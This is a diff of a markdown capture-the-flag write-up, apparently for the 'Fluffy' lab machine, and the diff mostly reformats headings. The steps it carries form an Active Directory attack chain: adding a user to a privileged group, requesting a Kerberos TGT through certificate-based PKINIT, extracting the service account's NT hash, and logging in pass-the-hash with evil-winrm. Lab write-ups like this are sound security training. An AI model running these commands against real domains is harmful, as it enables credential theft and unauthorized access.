@@ -82,41 +82,39 @@ Implications: User can indirectly modify service accounts. Compromising this use
 
 ---
 
-## Add User to Service Accounts
+### Add User to Service Accounts
 
-```
-net rpc group addmem "Service Accounts" "<USER>" \
-  -U "dc01.fluffy.htb"/"<USER>" -S "<TARGET_IP>" ```
+```net rpc group addmem "Service Accounts" "<USER>" \
+  -U "dc01.fluffy.htb"/"<USER>" -S "<TARGET_IP>"```
 
 
-Request Kerberos TGT for Service Account
+###Request Kerberos TGT for Service Account
 
 If your local time does not match the Domain Controller (DC), you may encounter errors. Synchronize time first:
 
 sudo rdate -n <TARGET_IP>
 
 
-Generate a TGT using faketime:
-```
-faketime '<DATE_TIME>' python3 gettgtpkinit.py \
+###Generate a TGT using faketime:
+```faketime '<DATE_TIME>' python3 gettgtpkinit.py \
   -cert-pem key_cert.pem \
   -key-pem key_priv.pem \
   fluffy.htb/<SERVICE_ACCOUNT> \
   <SERVICE_ACCOUNT>.ccache```
 
 
-Set the Kerberos ticket environment variable:
+###Set the Kerberos ticket environment variable:
 
 ```export KRB5CCNAME=<SERVICE_ACCOUNT>.ccache```
 
 
 Tip: Ensure the KRB5CCNAME export works in your virtual environment. Use an absolute path if necessary.
 
-Retrieve NT Hash
+###Retrieve NT Hash
 ```faketime '<DATE_TIME>' python3 getnthash.py \
   -key <KEY> fluffy.htb/<SERVICE_ACCOUNT>```
 
-Access Service Account
+###Access Service Account
 ```evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -H <NT_HASH>```
 
 
